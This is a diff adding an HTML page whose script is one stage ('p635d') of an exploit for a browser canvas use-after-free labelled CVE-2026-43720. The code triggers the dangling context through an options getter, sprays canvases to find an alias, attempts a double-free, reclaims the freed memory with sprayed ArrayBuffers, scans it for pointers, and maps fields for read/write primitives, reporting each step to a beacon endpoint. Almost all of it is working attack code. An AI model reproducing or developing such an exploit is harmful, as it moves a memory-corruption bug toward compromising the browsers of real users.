@@ -1,0 +1,337 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p635d</title></head>
+<body><pre id="out">p635d: Canvas UAF — double-free + offset mapping</pre>
+<script>
+'use strict';
+/*
+  p635d: CVE-2026-43720 — Phase E (double-free→ArrayBuffer) + Phase F (offset mapping)
+  -- prior art: p635c confirmed alias at spray[0-11], full field R/W, D cross-type=CRASH
+  -- skip: Phase D (ImageData cross-type crashes WebProcess)
+
+  CRASH_CLASS: HIGH — UAF double-free attempt
+*/
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, d) {
+  var msg = 'P635D-' + tag + (d !== undefined ? '-' + String(d).slice(0, 800) : '');
+  say(msg);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/api/beacon', false);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify({stage:'p635d', msg:msg, level:'info', sid:'p635d-'+Date.now(), ua:navigator.userAgent}));
+  } catch(e) {
+    try { new Image().src = '/beacon?m=' + encodeURIComponent(msg) + '&t=' + Date.now(); } catch(e2) {}
+  }
+}
+
+bk('START', navigator.userAgent);
+
+function f64hex(v) {
+  try {
+    var buf = new ArrayBuffer(8);
+    new Float64Array(buf)[0] = v;
+    var u = new Uint32Array(buf);
+    return ((u[1] >>> 0).toString(16)).padStart(8, '0') + ((u[0] >>> 0).toString(16)).padStart(8, '0');
+  } catch(e) { return 'ERR'; }
+}
+
+function isPointerLike(v) {
+  if (typeof v !== 'number' || v !== v) return false;
+  var buf = new ArrayBuffer(8);
+  new Float64Array(buf)[0] = v;
+  var hi = new Uint32Array(buf)[1];
+  return (hi >= 0xFFFF8000 && hi < 0xFFFFFFFF) || (hi >= 0x7F000000 && hi <= 0x7FFFFFFF)
+      || (hi >= 0x00007F00 && hi <= 0x00007FFF);
+}
+
+function triggerUAF() {
+  var inner = null;
+  var cv = document.createElement('canvas');
+  cv.width = 1; cv.height = 1;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function() { inner = cv.getContext('2d'); return true; }
+  });
+  try { cv.getContext('bitmaprenderer', opts); } catch(e) {}
+  return inner;
+}
+
+// Phase 0: confirm bitmaprenderer
+var tc = document.createElement('canvas');
+if (!tc.getContext('bitmaprenderer')) { bk('DEAD', 'no bmr'); throw new Error('no bmr'); }
+bk('P0', 'bmr OK');
+tc = null;
+
+// ================================================================
+// PHASE E: Double free — alias, write markers, free alias canvas,
+// spray ArrayBuffer(768), scan for markers or pointers
+// ================================================================
+bk('E-START', 'double-free to ArrayBuffer');
+var innerE = triggerUAF();
+if (!innerE) {
+  bk('E-FAIL', 'no inner');
+} else {
+  var sprayE = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayE.push({ctx: ctx, canvas: c});
+  }
+  bk('E-SPRAY', sprayE.length);
+
+  // Find alias
+  var SENTE = 8888.5;
+  try { innerE.lineWidth = SENTE; } catch(e) { bk('E-WRITE-ERR', e.message.slice(0,30)); }
+  var aliasE = -1;
+  for (var i = 0; i < sprayE.length; i++) {
+    if (sprayE[i].ctx.lineWidth === SENTE) { aliasE = i; break; }
+  }
+  bk('E-ALIAS', aliasE >= 0 ? 'spray[' + aliasE + ']' : 'NONE');
+
+  if (aliasE >= 0) {
+    // Write recognizable markers through inner (the dangling ref)
+    innerE.setTransform(0xDEAD, 0xBEEF, 0xCAFE, 0xBABE, 0xF00D, 0xFACE);
+    innerE.lineWidth = 0x41414141;
+    innerE.miterLimit = 0x42424242;
+    innerE.shadowBlur = 0x43434343;
+    innerE.shadowOffsetX = 0x44444444;
+    innerE.shadowOffsetY = 0x45454545;
+    innerE.lineDashOffset = 0x46464646;
+    bk('E-MARKED', 'wrote 0xDEAD..0x46464646');
+
+    // Verify markers visible through alias
+    try {
+      bk('E-VERIFY', 'alias.lw=' + sprayE[aliasE].ctx.lineWidth +
+         ' alias.ml=' + sprayE[aliasE].ctx.miterLimit);
+    } catch(e) { bk('E-VERIFY', 'ERR'); }
+
+    // Now "free" the alias canvas
+    var aliasCanvas = sprayE[aliasE].canvas;
+    var aliasCtx = sprayE[aliasE].ctx;
+    sprayE[aliasE].canvas = null;
+    sprayE[aliasE].ctx = null;
+
+    // Remove canvas from DOM, zero dimensions to trigger cleanup
+    if (aliasCanvas.parentNode) aliasCanvas.parentNode.removeChild(aliasCanvas);
+    aliasCanvas.width = 0;
+    aliasCanvas.height = 0;
+    aliasCanvas = null;
+    aliasCtx = null;
+
+    // GC pressure
+    for (var gc = 0; gc < 200; gc++) {
+      try { new ArrayBuffer(65536); } catch(e) { break; }
+    }
+    bk('E-FREED', 'alias canvas freed + GC');
+
+    // Check: is innerE still alive? (it should be — it's the UAF ref)
+    var innerAlive = false;
+    try {
+      var lwCheck = innerE.lineWidth;
+      innerAlive = true;
+      bk('E-INNER-CHECK', 'lw=' + lwCheck + ' (still alive)');
+    } catch(e) {
+      bk('E-INNER-CHECK', 'CRASH:' + e.message.slice(0,30));
+    }
+
+    // Spray ArrayBuffer(768) to reclaim the freed context's memory
+    var abSpray = [];
+    for (var i = 0; i < 500; i++) {
+      var ab = new ArrayBuffer(768);
+      // Fill with known pattern to distinguish from markers
+      var fill = new Uint8Array(ab);
+      for (var j = 0; j < 768; j++) fill[j] = 0xCC;
+      abSpray.push(ab);
+    }
+    bk('E-AB-SPRAY', abSpray.length + ' ABs (768B each, filled 0xCC)');
+
+    // Scan ArrayBuffers for our marker values
+    var markerFound = false;
+    var ptrFound = false;
+    for (var i = 0; i < abSpray.length; i++) {
+      var view = new Float64Array(abSpray[i]);
+      for (var j = 0; j < view.length; j++) {
+        var v = view[j];
+        if (v === 0xDEAD || v === 0xBEEF || v === 0xCAFE || v === 0xBABE ||
+            v === 0x41414141 || v === 0x42424242 || v === 0x43434343 ||
+            v === 0x44444444 || v === 0x45454545 || v === 0x46464646) {
+          bk('E-MARKER', 'AB[' + i + '][' + j + ']=' + f64hex(v) + ' ★MARKER');
+          markerFound = true;
+          // Dump full buffer
+          var dump = [];
+          for (var k = 0; k < view.length; k++) dump.push('[' + k + ']=' + f64hex(view[k]));
+          bk('E-DUMP', dump.join(' '));
+          break;
+        }
+        if (isPointerLike(v)) {
+          bk('E-PTR', 'AB[' + i + '][' + j + ']=' + f64hex(v) + ' ★PTR');
+          ptrFound = true;
+          var dump2 = [];
+          for (var k = 0; k < Math.min(view.length, 16); k++) dump2.push('[' + k + ']=' + f64hex(view[k]));
+          bk('E-PTR-DUMP', dump2.join(' '));
+          break;
+        }
+      }
+      if (markerFound || ptrFound) break;
+    }
+
+    if (!markerFound && !ptrFound) {
+      bk('E-RESULT', 'no markers or pointers — AB spray did not reclaim context memory');
+      // Check if we can still write through innerE and read through ABs
+      try {
+        innerE.lineWidth = 1337.7331;
+        bk('E-POST-WRITE', 'innerE.lw set to 1337.7331');
+        // Scan again for new value
+        for (var i = 0; i < Math.min(abSpray.length, 50); i++) {
+          var v2 = new Float64Array(abSpray[i]);
+          for (var j = 0; j < v2.length; j++) {
+            if (v2[j] === 1337.7331) {
+              bk('E-CROSS-WRITE', 'AB[' + i + '][' + j + ']=1337.7331 ★ALIAS-TO-AB');
+              markerFound = true;
+              break;
+            }
+          }
+          if (markerFound) break;
+        }
+        if (!markerFound) bk('E-NO-CROSS', 'write through innerE not visible in ABs');
+      } catch(e) {
+        bk('E-POST-WRITE', 'CRASH:' + e.message.slice(0,30));
+      }
+    }
+  }
+}
+bk('E-DONE', 'survived');
+
+// ================================================================
+// PHASE F: Offset mapping — write through alias, read through inner,
+// verify string channels (fillStyle, font, textAlign etc)
+// ================================================================
+bk('F-START', 'offset mapping');
+var innerF = triggerUAF();
+if (!innerF) {
+  bk('F-FAIL', 'no inner');
+} else {
+  var sprayF = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayF.push(ctx);
+  }
+  var SENTF = 4242.75;
+  try { innerF.lineWidth = SENTF; } catch(e) {}
+  var aliasF = -1;
+  for (var i = 0; i < sprayF.length; i++) {
+    if (sprayF[i].lineWidth === SENTF) { aliasF = i; break; }
+  }
+  bk('F-ALIAS', aliasF >= 0 ? 'spray[' + aliasF + ']' : 'NONE');
+
+  if (aliasF >= 0) {
+    var af = sprayF[aliasF];
+
+    // Write unique values through ALIAS
+    af.setTransform(1.0000001, 2.0000002, 3.0000003, 4.0000004, 5.0000005, 6.0000006);
+    af.lineWidth = 11.11;
+    af.miterLimit = 22.22;
+    af.globalAlpha = 0.3333;
+    af.shadowBlur = 44.44;
+    af.shadowOffsetX = 55.55;
+    af.shadowOffsetY = 66.66;
+    af.lineDashOffset = 77.77;
+
+    // Read back through INNER
+    var map = [];
+    try { map.push('lw:' + (innerF.lineWidth === 11.11)); } catch(e) { map.push('lw:E'); }
+    try { map.push('ml:' + (innerF.miterLimit === 22.22)); } catch(e) { map.push('ml:E'); }
+    try { map.push('ga:' + (innerF.globalAlpha === 0.3333)); } catch(e) { map.push('ga:E'); }
+    try { map.push('sb:' + (innerF.shadowBlur === 44.44)); } catch(e) { map.push('sb:E'); }
+    try { map.push('sox:' + (innerF.shadowOffsetX === 55.55)); } catch(e) { map.push('sox:E'); }
+    try { map.push('soy:' + (innerF.shadowOffsetY === 66.66)); } catch(e) { map.push('soy:E'); }
+    try { map.push('ldo:' + (innerF.lineDashOffset === 77.77)); } catch(e) { map.push('ldo:E'); }
+    try {
+      var txF = innerF.getTransform();
+      map.push('tx.a:' + (txF.a === 1.0000001));
+      map.push('tx.b:' + (txF.b === 2.0000002));
+      map.push('tx.c:' + (txF.c === 3.0000003));
+      map.push('tx.d:' + (txF.d === 4.0000004));
+      map.push('tx.e:' + (txF.e === 5.0000005));
+      map.push('tx.f:' + (txF.f === 6.0000006));
+    } catch(e) { map.push('tx:E'); }
+    bk('F-MAP', map.join(' '));
+
+    // Reverse: write through INNER, read through ALIAS
+    innerF.lineWidth = 99.99;
+    innerF.miterLimit = 88.88;
+    var rev = [];
+    try { rev.push('lw:' + (af.lineWidth === 99.99)); } catch(e) { rev.push('lw:E'); }
+    try { rev.push('ml:' + (af.miterLimit === 88.88)); } catch(e) { rev.push('ml:E'); }
+    bk('F-REV', rev.join(' '));
+
+    // String channels
+    try {
+      af.fillStyle = '#aabbcc';
+      bk('F-FS', 'alias=#aabbcc inner=' + innerF.fillStyle);
+    } catch(e) { bk('F-FS', 'ERR:' + e.message.slice(0,30)); }
+
+    try {
+      af.strokeStyle = '#ddeeff';
+      bk('F-SS', 'alias=#ddeeff inner=' + innerF.strokeStyle);
+    } catch(e) { bk('F-SS', 'ERR:' + e.message.slice(0,30)); }
+
+    try {
+      af.font = '12px serif';
+      bk('F-FONT', 'alias=12px serif inner=' + innerF.font);
+    } catch(e) { bk('F-FONT', 'ERR:' + e.message.slice(0,30)); }
+
+    try {
+      af.textAlign = 'center';
+      bk('F-TA', 'alias=center inner=' + innerF.textAlign);
+    } catch(e) { bk('F-TA', 'ERR:' + e.message.slice(0,30)); }
+
+    try {
+      af.textBaseline = 'middle';
+      bk('F-TB', 'alias=middle inner=' + innerF.textBaseline);
+    } catch(e) { bk('F-TB', 'ERR:' + e.message.slice(0,30)); }
+
+    try {
+      af.globalCompositeOperation = 'multiply';
+      bk('F-GCO', 'alias=multiply inner=' + innerF.globalCompositeOperation);
+    } catch(e) { bk('F-GCO', 'ERR:' + e.message.slice(0,30)); }
+
+    try {
+      af.lineCap = 'round';
+      bk('F-LC', 'alias=round inner=' + innerF.lineCap);
+    } catch(e) { bk('F-LC', 'ERR:' + e.message.slice(0,30)); }
+
+    try {
+      af.lineJoin = 'bevel';
+      bk('F-LJ', 'alias=bevel inner=' + innerF.lineJoin);
+    } catch(e) { bk('F-LJ', 'ERR:' + e.message.slice(0,30)); }
+
+    // Hex dump of all doubles through inner
+    var hexAll = [];
+    try { hexAll.push('lw=' + f64hex(innerF.lineWidth)); } catch(e) {}
+    try { hexAll.push('ml=' + f64hex(innerF.miterLimit)); } catch(e) {}
+    try { hexAll.push('ga=' + f64hex(innerF.globalAlpha)); } catch(e) {}
+    try { hexAll.push('sb=' + f64hex(innerF.shadowBlur)); } catch(e) {}
+    try { hexAll.push('sox=' + f64hex(innerF.shadowOffsetX)); } catch(e) {}
+    try { hexAll.push('soy=' + f64hex(innerF.shadowOffsetY)); } catch(e) {}
+    try { hexAll.push('ldo=' + f64hex(innerF.lineDashOffset)); } catch(e) {}
+    try {
+      var txH = innerF.getTransform();
+      hexAll.push('tx.a=' + f64hex(txH.a) + ' tx.b=' + f64hex(txH.b) +
+                  ' tx.c=' + f64hex(txH.c) + ' tx.d=' + f64hex(txH.d) +
+                  ' tx.e=' + f64hex(txH.e) + ' tx.f=' + f64hex(txH.f));
+    } catch(e) {}
+    bk('F-HEX', hexAll.join(' '));
+  }
+}
+bk('F-DONE', 'survived');
+
+bk('DONE', 'all phases complete');
+</script>
+</body></html>
